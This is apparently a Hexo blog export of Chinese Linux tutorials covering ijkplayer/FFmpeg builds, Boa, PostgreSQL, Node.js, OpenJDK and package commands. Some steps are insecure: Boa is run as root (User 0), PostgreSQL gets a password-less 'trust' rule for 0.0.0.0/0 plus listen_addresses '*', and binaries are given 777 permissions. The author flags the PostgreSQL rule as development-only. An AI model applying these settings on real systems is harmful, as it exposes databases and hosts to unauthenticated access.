<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim ijkplayer/init-android.sh</span><br><span class="line"></span><br><span class="line">IJK_FFMPEG_COMMIT=ff4.0--ijk0.8.8--20210426--001</span><br><span class="line">#IJK_FFMPEG_COMMIT=ff3.4--ijk0.8.7--20180103--001</span><br><span class="line"></span><br><span class="line"># 下载新版本源码</span><br><span class="line">$ ./init_android.sh</span><br></pre></td></tr></table></figure>
<p> 版本改为<code>ff4.0--ijk0.8.8--20210426--001</code>，即4.0版，参考<a href="https://github.com/bilibili/ijkplayer/issues/5290" target="_blank" rel="noopener">【issues/5290】</a>。</p>
</li>
<li><p>修改编译ffmpeg的配置<br>如果现在编译，肯定报错，由于4.0版本有些东西已经丢弃，所以裁剪的配置文件要变动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim ijkplayer/config/module-lite.sh</span><br><span class="line"></span><br><span class="line"># 注释这两行，否则编译会报错</span><br><span class="line">#export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-ffserver&quot;</span><br><span class="line">#export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-vda&quot;</span><br><span class="line"></span><br><span class="line"># 注释掉以上两项，编译还会出现以下错误：</span><br><span class="line"># ijkplayer/android/contrib/ffmpeg-arm64/libavcodec/eac3_core_bsf.c:39: undefined reference to `ff_ac3_parse_header&apos;</span><br><span class="line"># ijkplayer/android/contrib/ffmpeg-arm64/libavcodec/eac3_core_bsf.c:55: undefined reference to `ff_ac3_parse_header&apos;</span><br><span class="line"></span><br><span class="line"># 还需加入以下这一行</span><br><span class="line">export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-bsf=eac3_core&quot;</span><br><span class="line"># 这一行的位置一开始随便放在文件头，结果编译一直没过</span><br><span class="line"># 移到 `./configure --list-bsf` 这个位置，编译就OK。</span><br></pre></td></tr></table></figure>
<p> 这个问题是参考<a href="https://github.com/bilibili/ijkplayer/issues/4772" target="_blank" rel="noopener">【【ijkplayer issues/4772】</a></p>
</li>
<li>重新编译<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ijkplayer/android/contrib</span><br><span class="line">$ ./compile-ffmpeg.sh clean</span><br><span class="line">$ ./compile-ffmpeg.sh all</span><br><span class="line">$ cd ../</span><br><span class="line">$ ./compile-ijk.sh clean</span><br><span class="line">$ ./compile-ijk.sh all</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="九、参考"><a href="#九、参考" class="headerlink" title="九、参考"></a>九、参考</h2><p><a href="https://www.linuxidc.com/Linux/2018-05/152647.htm" target="_blank" rel="noopener">【Ubuntu 18.04 编译 ijkplayer】</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ijplayer</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装 Boa Web服务</title>
    <url>/Linux/Ubuntu%20%E5%AE%89%E8%A3%85%20Boa/</url>
    <content><![CDATA[<p>Boa是一个只有大概60KB的WebServer，很适合运行在嵌入式硬件设备的Web服务。</p>
<p>在 X86-Ubuntu中安装Boa的日志：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget http://www.boa.org/boa-0.94.14rc21.tar.gz</span><br><span class="line">$ tar zxvf boa-0.94.14rc21.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> boa-0.94.14rc21/</span><br><span class="line">$ ls</span><br><span class="line">aclocal.m4  config.guess  configure     contrib  CREDITS  examples         extras      Makefile.in  src</span><br><span class="line">CHANGES     config.sub    configure.in  COPYING  docs     extra_macros.m4  install-sh  README</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ ls src/</span><br><span class="line">access.c  boa.c        buffer.o      compat.h     defines.h  get.o        index_dir.o  Makefile      pipe.o   range.o    response.c  signals.o    util.c</span><br><span class="line">access.h  boa.h        cgi.c         config.c     escape.c   globals.h    ip.c         Makefile.in   poll.c   read.c     response.o  sublog.c     util.o</span><br><span class="line">alias.c   boa_indexer  cgi_header.c  config.h     escape.h   hash.c       ip.o         mmap_cache.c  queue.c  read.o     select.c    sublog.o</span><br><span class="line">alias.o   boa.o        cgi_header.o  config.h.in  escape.o   hash.o       log.c        mmap_cache.o  queue.o  request.c  select.o    timestamp.c</span><br><span class="line">boa       buffer.c     cgi.o         config.o     get.c      index_dir.c  log.o        pipe.c        range.c  request.o  signals.c   timestamp.o</span><br><span class="line">$ sudo mkdir /etc/boa</span><br><span class="line">$ ls contrib/rpm/</span><br><span class="line">boa.conf  boa.init-redhat  boa.init-suse  boa.logrotate  boa.spec</span><br><span class="line">$ sudo cp contrib/rpm/boa.conf /etc/boa</span><br><span class="line">$ sudo ./src/boa</span><br><span class="line">[13/Oct/2020:02:37:06 +0000] No such group: nobody</span><br><span class="line">[13/Oct/2020:02:37:06 +0000] log.c:53 (open_logs) - unable to open error <span class="built_in">log</span>: No such file or directory</span><br><span class="line">$ sudo mkdir /var/<span class="built_in">log</span>/boa</span><br><span class="line">$ sudo vim /etc/boa/boa.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改默认端口</span></span><br><span class="line">Port 8080</span><br><span class="line"><span class="comment">#修改运行身份</span></span><br><span class="line">User 0</span><br><span class="line">Group 0</span><br><span class="line"><span class="comment">#html存放路径</span></span><br><span class="line">DocumentRoot /www</span><br><span class="line">$ sudo ./src/boa</span><br><span class="line">$ ps -ef|grep boa</span><br><span class="line">root      48727      1  0 11:00 pts/0    00:00:00 ./src/boa</span><br><span class="line">$ netstat -tnlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Boa</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装FFmpeg</title>
    <url>/Linux/Ubuntu%20%E5%AE%89%E8%A3%85FFmpeg/</url>
    <content><![CDATA[<h2 id="1-二进制文件下载（推荐）"><a href="#1-二进制文件下载（推荐）" class="headerlink" title="1. 二进制文件下载（推荐）"></a>1. 二进制文件下载（推荐）</h2><p>Ubuntu直接下载<a href="https://launchpad.net/ubuntu/+source/ffmpeg" target="_blank" rel="noopener">deb包</a> ，用 <code>dpkg -i</code> 安装。</p>
<blockquote>
<p>注：Ubuntu或者其他版本的linux，也可以下载<a href="http://ffmpeg.org/download.html#build-linux" target="_blank" rel="noopener">Linux Static Builds</a> 可执行文件 , 放在 <code>/usr/bin</code> 目录下，修改权限为可执行(777)即可。</p>
</blockquote>
<h2 id="2-命令安装"><a href="#2-命令安装" class="headerlink" title="2. 命令安装"></a>2. 命令安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:mc3man/trusty-media</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ffmpeg</span><br></pre></td></tr></table></figure>
<p>缺点：国内下载速度会比较慢</p>
<h2 id="3-源码编译安装"><a href="#3-源码编译安装" class="headerlink" title="3. 源码编译安装"></a>3. 源码编译安装</h2><p><a href="https://johnvansickle.com/ffmpeg/" target="_blank" rel="noopener">源码下载</a>，自己编译，需要C/C++编译环境，比较麻烦，省。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>FFmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装卸载软件</title>
    <url>/Linux/Ubuntu%20%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="apt-get"><a href="#apt-get" class="headerlink" title="apt-get"></a>apt-get</h2><ol>
<li><p>查看可安装的软件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-cache search all</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取包的相关信息</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-cache show</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove 软件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除包，包括删除配置文件等</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove 软件名 --purge</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除包及其依赖的软件包+配置文件等</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove --purge</span><br></pre></td></tr></table></figure>
</li>
<li><p>理下载文件的存档 &amp;&amp; 只清理过时的包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get clean &amp;&amp; apt-get autoclean</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="dpkg"><a href="#dpkg" class="headerlink" title="dpkg"></a>dpkg</h2><ol>
<li><p>查看软件包所在的目录以及该软件包中的所有文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -L 软件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看软件包的版本信息</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -l 软件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -l | grep <span class="string">'软件名'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装deb包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i 软件包</span><br></pre></td></tr></table></figure>
</li>
<li><p>卸载软件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -r 软件包</span><br></pre></td></tr></table></figure>
</li>
<li><p>卸载软件及包括配置文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo dpkg -P 软件包</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装Nodejs</title>
    <url>/Linux/Ubuntu%E5%AE%89%E8%A3%85NodeJS/</url>
    <content><![CDATA[<p>Ubuntu默认安装的Nodejs版本都是比较低的（差很多），无法编译Vue，所以要安装最新版本。<br>思路是先安装旧版本，再升级到最新版本。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 先安装旧版</span></span><br><span class="line">$ sudo apt install -y nodejs npm</span><br><span class="line"><span class="comment"># 2. 换源</span></span><br><span class="line">$ sudo npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"><span class="comment"># 3. 安装工具 n (管理 node 版本)</span></span><br><span class="line">$ sudo npm install n -g</span><br><span class="line"><span class="comment"># 4. node升级安装最新版本</span></span><br><span class="line">$ sudo n stable</span><br><span class="line"><span class="comment"># 5. npm升级安装最新版本(要先升级node再升级npm)</span></span><br><span class="line">$ sudo npm install -g npm</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>nodejs,npm</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu中安装IDEA设置桌面图标</title>
    <url>/Linux/Ubuntu%E4%B8%AD%E5%AE%89%E8%A3%85IDEA%E8%AE%BE%E7%BD%AE%E6%A1%8C%E9%9D%A2%E5%9B%BE%E6%A0%87/</url>
    <content><![CDATA[<p>在Ubuntu桌面版中安装IDEA，Jetbrains只提供 <code>tar.gz</code> 格式包，解压即可使用，但需要执行 <code>idea.sh</code> ，没有快捷方式对桌面系统很不友好。</p>
<p>我们可以手动编辑一个快捷方式，在桌面创建一个名为 <code>idea.desktop</code>的文件，假如我们解压目录地址为 <code>/usr/local</code> 内容为：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line"></span><br><span class="line">Version=2021.2.2</span><br><span class="line"></span><br><span class="line">Type=Application</span><br><span class="line"></span><br><span class="line">Name=IDEA</span><br><span class="line"></span><br><span class="line">Comment=IntelliJ IDEA</span><br><span class="line"></span><br><span class="line">Exec=sh /usr/<span class="built_in">local</span>/idea/bin/idea.sh</span><br><span class="line"></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Icon=/usr/<span class="built_in">local</span>/idea/bin/idea.png</span><br><span class="line"></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Encoding=UTF-8</span><br><span class="line"></span><br><span class="line">Categories=Development;</span><br></pre></td></tr></table></figure></p>
<p>还需要给这个文件赋予运行权限：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo chmod +x idea.desktop</span><br></pre></td></tr></table></figure></p>
<p>这样双击就能打开IDEA啦！</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu安装PostgreSQL</title>
    <url>/Linux/Ubuntu%E5%AE%89%E8%A3%85PostgreSQL/</url>
    <content><![CDATA[<p>Ubuntu默认安装的PostgreSQL版本都是比较低的（差很多），通过官方源来安装最新的版本。</p>
<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p>参考<a href="https://www.postgresql.org/download/linux/ubuntu/" target="_blank" rel="noopener">【Linux downloads (Ubuntu) 】</a><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> sudo sh -c 'echo "deb http://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main" &gt; /etc/apt/sources.list.d/pgdg.list'</span><br><span class="line"><span class="meta">$</span> wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -</span><br><span class="line"><span class="meta">$</span> sudo apt-get update</span><br><span class="line"><span class="meta">$</span> sudo apt-get -y install postgresql</span><br><span class="line"><span class="meta">$</span> sudo service postgresql status</span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (exited) since Wed 2022-05-25 10:18:58 CST; 18min ago</span><br><span class="line">   Main PID: 4020835 (code=exited, status=0/SUCCESS)</span><br><span class="line">      Tasks: 0 (limit: 4578)</span><br><span class="line">     Memory: 0B</span><br><span class="line">     CGroup: /system.slice/postgresql.service</span><br><span class="line"></span><br><span class="line">May 25 10:18:58 cnubuntu systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 25 10:18:58 cnubuntu systemd[1]: Finished PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure></p>
<h3 id="二、查看版本"><a href="#二、查看版本" class="headerlink" title="二、查看版本"></a>二、查看版本</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo -u postgres psql -c <span class="string">'SELECT version();'</span></span><br><span class="line"></span><br><span class="line"> PostgreSQL 14.3 (Ubuntu 14.3-1.pgdg20.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit</span><br></pre></td></tr></table></figure>
<h3 id="三、客户端命令行"><a href="#三、客户端命令行" class="headerlink" title="三、客户端命令行"></a>三、客户端命令行</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># postgres是默认的超级用户，默认没有密码。</span></span><br><span class="line">$ sudo -u postgres psql</span><br><span class="line">psql (14.3 (Ubuntu 14.3-1.pgdg20.04+1))</span><br><span class="line">Type <span class="string">"help"</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以执行SQL命令</span></span><br><span class="line">postgres=<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个数据库mytest</span></span><br><span class="line">postgres=<span class="comment"># CREATE DATABASE mytest;</span></span><br><span class="line">CREATE DATABASE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个用户(ROLE)</span></span><br><span class="line">postgres=<span class="comment"># CREATE USER test;</span></span><br><span class="line">CREATE ROLE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个用户(ROLE)带密码</span></span><br><span class="line">postgres=<span class="comment"># CREATE USER demo password '123456';</span></span><br><span class="line">CREATE ROLE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">postgres-<span class="comment"># \q</span></span><br></pre></td></tr></table></figure>
<h3 id="四、认证"><a href="#四、认证" class="headerlink" title="四、认证"></a>四、认证</h3><p>PostgreSQL提供多种不同的客户端认证方式，而 <code>/etc/postgresql/14/main/pg_hba.conf</code> 就是认证的配置文件，<code>pg_hba</code> 即 <code>PostGreSQL host-base authentication</code> 的简称。<br>参考<a href="http://www.postgres.cn/docs/14/auth-pg-hba-conf.html" target="_blank" rel="noopener">【第 21 章 客户端认证】</a>可以做出很多方式的认证，这里作为测试，信任所有来源，勿在生产环境这样设置。</p>
<p>这是默认配置 <code>pg_hba.conf</code>:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># PostgreSQL Client Authentication Configuration File</span><br><span class="line"># ===================================================</span><br><span class="line">#</span><br><span class="line"># Refer to the &quot;Client Authentication&quot; section in the PostgreSQL</span><br><span class="line"># documentation for a complete description of this file.  A short</span><br><span class="line"># synopsis follows.</span><br><span class="line">#</span><br><span class="line"># This file controls: which hosts are allowed to connect, how clients</span><br><span class="line"># are authenticated, which PostgreSQL user names they can use, which</span><br><span class="line"># databases they can access.  Records take one of these forms:</span><br><span class="line">#</span><br><span class="line"># local         DATABASE  USER  METHOD  [OPTIONS]</span><br><span class="line"># host          DATABASE  USER  ADDRESS  METHOD  [OPTIONS]</span><br><span class="line"># hostssl       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]</span><br><span class="line"># hostnossl     DATABASE  USER  ADDRESS  METHOD  [OPTIONS]</span><br><span class="line"># hostgssenc    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]</span><br><span class="line"># hostnogssenc  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]</span><br><span class="line">#</span><br><span class="line"># (The uppercase items must be replaced by actual values.)</span><br><span class="line">#</span><br><span class="line"># The first field is the connection type:</span><br><span class="line"># - &quot;local&quot; is a Unix-domain socket</span><br><span class="line"># - &quot;host&quot; is a TCP/IP socket (encrypted or not)</span><br><span class="line"># - &quot;hostssl&quot; is a TCP/IP socket that is SSL-encrypted</span><br><span class="line"># - &quot;hostnossl&quot; is a TCP/IP socket that is not SSL-encrypted</span><br><span class="line"># - &quot;hostgssenc&quot; is a TCP/IP socket that is GSSAPI-encrypted</span><br><span class="line"># - &quot;hostnogssenc&quot; is a TCP/IP socket that is not GSSAPI-encrypted</span><br><span class="line">#</span><br><span class="line"># DATABASE can be &quot;all&quot;, &quot;sameuser&quot;, &quot;samerole&quot;, &quot;replication&quot;, a</span><br><span class="line"># database name, or a comma-separated list thereof. The &quot;all&quot;</span><br><span class="line"># keyword does not match &quot;replication&quot;. Access to replication</span><br><span class="line"># must be enabled in a separate record (see example below).</span><br><span class="line">#</span><br><span class="line"># USER can be &quot;all&quot;, a user name, a group name prefixed with &quot;+&quot;, or a</span><br><span class="line"># comma-separated list thereof.  In both the DATABASE and USER fields</span><br><span class="line"># you can also write a file name prefixed with &quot;@&quot; to include names</span><br><span class="line"># from a separate file.</span><br><span class="line">#</span><br><span class="line"># ADDRESS specifies the set of hosts the record matches.  It can be a</span><br><span class="line"># host name, or it is made up of an IP address and a CIDR mask that is</span><br><span class="line"># an integer (between 0 and 32 (IPv4) or 128 (IPv6) inclusive) that</span><br><span class="line"># specifies the number of significant bits in the mask.  A host name</span><br><span class="line"># that starts with a dot (.) matches a suffix of the actual host name.</span><br><span class="line"># Alternatively, you can write an IP address and netmask in separate</span><br><span class="line"># columns to specify the set of hosts.  Instead of a CIDR-address, you</span><br><span class="line"># can write &quot;samehost&quot; to match any of the server&apos;s own IP addresses,</span><br><span class="line"># or &quot;samenet&quot; to match any address in any subnet that the server is</span><br><span class="line"># directly connected to.</span><br><span class="line">#</span><br><span class="line"># METHOD can be &quot;trust&quot;, &quot;reject&quot;, &quot;md5&quot;, &quot;password&quot;, &quot;scram-sha-256&quot;,</span><br><span class="line"># &quot;gss&quot;, &quot;sspi&quot;, &quot;ident&quot;, &quot;peer&quot;, &quot;pam&quot;, &quot;ldap&quot;, &quot;radius&quot; or &quot;cert&quot;.</span><br><span class="line"># Note that &quot;password&quot; sends passwords in clear text; &quot;md5&quot; or</span><br><span class="line"># &quot;scram-sha-256&quot; are preferred since they send encrypted passwords.</span><br><span class="line">#</span><br><span class="line"># OPTIONS are a set of options for the authentication in the format</span><br><span class="line"># NAME=VALUE.  The available options depend on the different</span><br><span class="line"># authentication methods -- refer to the &quot;Client Authentication&quot;</span><br><span class="line"># section in the documentation for a list of which options are</span><br><span class="line"># available for which authentication methods.</span><br><span class="line">#</span><br><span class="line"># Database and user names containing spaces, commas, quotes and other</span><br><span class="line"># special characters must be quoted.  Quoting one of the keywords</span><br><span class="line"># &quot;all&quot;, &quot;sameuser&quot;, &quot;samerole&quot; or &quot;replication&quot; makes the name lose</span><br><span class="line"># its special character, and just match a database or username with</span><br><span class="line"># that name.</span><br><span class="line">#</span><br><span class="line"># This file is read on server startup and when the server receives a</span><br><span class="line"># SIGHUP signal.  If you edit the file on a running system, you have to</span><br><span class="line"># SIGHUP the server for the changes to take effect, run &quot;pg_ctl reload&quot;,</span><br><span class="line"># or execute &quot;SELECT pg_reload_conf()&quot;.</span><br><span class="line">#</span><br><span class="line"># Put your actual configuration here</span><br><span class="line"># ----------------------------------</span><br><span class="line">#</span><br><span class="line"># If you want to allow non-local connections, you need to add more</span><br><span class="line"># &quot;host&quot; records.  In that case you will also need to make PostgreSQL</span><br><span class="line"># listen on a non-local interface via the listen_addresses</span><br><span class="line"># configuration parameter, or via the -i or -h command line switches.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># DO NOT DISABLE!</span><br><span class="line"># If you change this first entry you will need to make sure that the</span><br><span class="line"># database superuser can access the database using some other method.</span><br><span class="line"># Noninteractive access to all databases is required during automatic</span><br><span class="line"># maintenance (custom daily cronjobs, replication, and similar tasks).</span><br><span class="line">#</span><br><span class="line"># Database administrative login by Unix domain socket</span><br><span class="line">local   all             postgres                                peer</span><br><span class="line"></span><br><span class="line"># TYPE  DATABASE        USER            ADDRESS                 METHOD</span><br><span class="line"></span><br><span class="line"># &quot;local&quot; is for Unix domain socket connections only</span><br><span class="line">local   all             all                                     peer</span><br><span class="line"># IPv4 local connections:</span><br><span class="line">host    all             all             127.0.0.1/32            scram-sha-256</span><br><span class="line"># IPv6 local connections:</span><br><span class="line">host    all             all             ::1/128                 scram-sha-256</span><br><span class="line"># Allow replication connections from localhost, by a user with the</span><br><span class="line"># replication privilege.</span><br><span class="line">local   replication     all                                     peer</span><br><span class="line">host    replication     all             127.0.0.1/32            scram-sha-256</span><br><span class="line">host    replication     all             ::1/128                 scram-sha-25</span><br></pre></td></tr></table></figure></p>
<p>由于是开发环境，设置为允许局域网内免密码连接，加入以下一行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># TYPE  DATABASE        USER                  ADDRESS                 METHOD</span><br><span class="line"># IPV4  所有数据库       多个用户“,”分割        所有地址                 信任，不用密码连接</span><br><span class="line">host    all             test,demo             0.0.0.0/0               trust</span><br></pre></td></tr></table></figure></p>
<h3 id="五、开启允许远程连接"><a href="#五、开启允许远程连接" class="headerlink" title="五、开启允许远程连接"></a>五、开启允许远程连接</h3><p>默认是只允许本地 ‘localhost’ 连接，改为 ‘*’，重启支持远程连接。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/postgresql/14/main/postgresql.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#listen_addresses = 'localhost'         # what IP address(es) to listen on;</span></span><br><span class="line">                                        <span class="comment"># comma-separated list of addresses;</span></span><br><span class="line">                                        <span class="comment"># defaults to 'localhost'; use '*' for all</span></span><br><span class="line">                                        <span class="comment"># (change requires restart)</span></span><br><span class="line">listen_addresses = <span class="string">'*'</span>       </span><br><span class="line"></span><br><span class="line">$ service postgresql restart</span><br></pre></td></tr></table></figure></p>
<p>用IDEA自带的数据库工具测试test账号无密码连接成功。<br><img src="/images/linux/postgresql_connect.png" alt></p>
<p>如果是要密码，则可以这样设置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host    all             all             0.0.0.0/0               md5</span><br></pre></td></tr></table></figure></p>
<p>这样的话，要用 用户名+密码（demo）来连接，没有设置密码的用户（test）则不能连接。</p>
<p><img src="/images/linux/postgresql_connect_demo.png" alt><br><img src="/images/linux/postgresql_connect_test.png" alt></p>
<h3 id="六、安装Web图形工具pgAdmin"><a href="#六、安装Web图形工具pgAdmin" class="headerlink" title="六、安装Web图形工具pgAdmin"></a>六、安装Web图形工具pgAdmin</h3><p>参考</p>
<ul>
<li><a href="https://www.pgadmin.org/download" target="_blank" rel="noopener">【pgadmin download】</a></li>
<li><a href="https://www.pgadmin.org/download/pgadmin-4-apt/" target="_blank" rel="noopener">【pgadmin apt)】</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo curl https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo apt-key add</span><br><span class="line">$ sudo sh -c &apos;echo &quot;deb https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main&quot; &gt; /etc/apt/sources.list.d/pgadmin4.list &amp;&amp; apt update&apos;</span><br><span class="line"></span><br><span class="line"># Install for both desktop and web modes:</span><br><span class="line">sudo apt install pgadmin4</span><br><span class="line"></span><br><span class="line"># Install for desktop mode only:</span><br><span class="line">sudo apt install pgadmin4-desktop</span><br><span class="line"></span><br><span class="line"># Install for web mode only: </span><br><span class="line">sudo apt install pgadmin4-web </span><br><span class="line"></span><br><span class="line"># Configure the webserver, if you installed pgadmin4-web:</span><br><span class="line">sudo /usr/pgadmin4/bin/setup-web.sh</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装OpenJDK</title>
    <url>/Linux/Ubuntu%E5%AE%89%E8%A3%85OpenJDK/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ sudo add-apt-repository ppa:openjdk-r/ppa</span><br><span class="line"></span><br><span class="line">$ sudp apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装java8</span></span><br><span class="line">$ sudo apt-get install openjdk-8-jdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装java11</span></span><br><span class="line">$ sudo apt-get install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line">$ java -version</span><br><span class="line">openjdk version <span class="string">"11.0.8"</span> 2020-07-14</span><br><span class="line">OpenJDK Runtime Environment (build 11.0.8+10-post-Ubuntu-0ubuntu118.04.1)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 11.0.8+10-post-Ubuntu-0ubuntu118.04.1, mixed mode, sharing)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>systemctl-命令</title>
    <url>/Linux/systemctl-%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p><a href="https://linux.cn/article-5926-1.html" target="_blank" rel="noopener">https://linux.cn/article-5926-1.html</a></p>
<p>列出所有服务（包括启用的和禁用的）    </p>
<h1 id="systemctl-list-unit-files-–type-service"><a href="#systemctl-list-unit-files-–type-service" class="headerlink" title="systemctl list-unit-files –type=service"></a>systemctl list-unit-files –type=service</h1><h1 id="systemctl-start-httpd-service"><a href="#systemctl-start-httpd-service" class="headerlink" title="systemctl start httpd.service"></a>systemctl start httpd.service</h1><h1 id="systemctl-restart-httpd-service"><a href="#systemctl-restart-httpd-service" class="headerlink" title="systemctl restart httpd.service"></a>systemctl restart httpd.service</h1><h1 id="systemctl-stop-httpd-service"><a href="#systemctl-stop-httpd-service" class="headerlink" title="systemctl stop httpd.service"></a>systemctl stop httpd.service</h1><h1 id="systemctl-reload-httpd-service"><a href="#systemctl-reload-httpd-service" class="headerlink" title="systemctl reload httpd.service"></a>systemctl reload httpd.service</h1><h1 id="systemctl-status-httpd-service"><a href="#systemctl-status-httpd-service" class="headerlink" title="systemctl status httpd.service"></a>systemctl status httpd.service</h1><p>系统启动时自动启动服务</p>
<h1 id="systemctl-enable-httpd-service"><a href="#systemctl-enable-httpd-service" class="headerlink" title="systemctl enable httpd.service"></a>systemctl enable httpd.service</h1><h1 id="systemctl-disable-httpd-service"><a href="#systemctl-disable-httpd-service" class="headerlink" title="systemctl disable httpd.service"></a>systemctl disable httpd.service</h1><p>使用systemctl命令杀死服务</p>
<h1 id="systemctl-kill-httpd"><a href="#systemctl-kill-httpd" class="headerlink" title="systemctl kill httpd"></a>systemctl kill httpd</h1><h1 id="systemctl-status-httpd"><a href="#systemctl-status-httpd" class="headerlink" title="systemctl status httpd"></a>systemctl status httpd</h1><p>按CPU、内存、输入和输出列出控制组</p>
